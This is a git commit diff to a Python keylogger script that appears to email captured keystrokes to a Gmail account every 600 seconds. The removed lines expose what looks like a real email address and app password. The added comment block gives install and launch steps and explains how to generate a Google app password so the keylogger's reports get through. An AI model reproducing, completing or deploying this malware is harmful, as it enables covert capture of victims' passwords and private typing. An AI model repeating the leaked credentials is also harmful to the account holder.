832fcd80dd4c219189a32c02e45196481d58a57e
Joseph2045 <josephkibiki60@gmail.com>
2025-07-07 16:23:56 +0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -5,8 +5,8 @@ from datetime import datetime
 from email.mime.text import MIMEText
 
 SEND_REPORT_EVERY = 600  # in seconds
-EMAIL_ADDRESS = "josephkibiki60@gmail.com"
-EMAIL_PASSWORD = "vgqj jcuy totf lala"
+EMAIL_ADDRESS = "@gmail.com"
+EMAIL_PASSWORD = "email_password"
 
 class Keylogger:
     def __init__(self, interval):
@@ -65,3 +65,29 @@ class Keylogger:
 if __name__ == "__main__":
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
+
+#CREATED BY EARL JOKHA
+       #required to install
+          #pip install keyboard
+           #pip install smtplib
+              # to launch
+               # python keylogger.py
+               #(How to Fix the Email Error (535 Bad Credentials)
+                    #✅ Method 1: Use an App Password (Recommended)
+                    #Enable 2-Step Verification (Required for App Passwords):
+
+                    #Go to: https://myaccount.google.com/security
+
+                    #Under "Signing in to Google", enable 2-Step Verification.
+
+                    #Generate an App Password:
+
+                    #Go to: https://myaccount.google.com/apppasswords
+
+                    #Select "Mail" → "Other (Custom Name)" → Name it Python Keylogger.
+
+                    #Click Generate → Copy the 16-digit password.
+
+#SEND_REPORT_EVERY = 600  # in seconds( u can change use your own time )
+#EMAIL_ADDRESS = "@gmail.com"
+#EMAIL_PASSWORD = "email_password"  replace EMAIL WITH YOUR EMAIL AND PASSWORD WITH YOUR PASSWORD EMAIL as explain above to obtain password for your keyloger for much safety DO NOT USE YOUR PASSWORD FOR EMAIL JUST CREATE APP PASSWORD as explain 
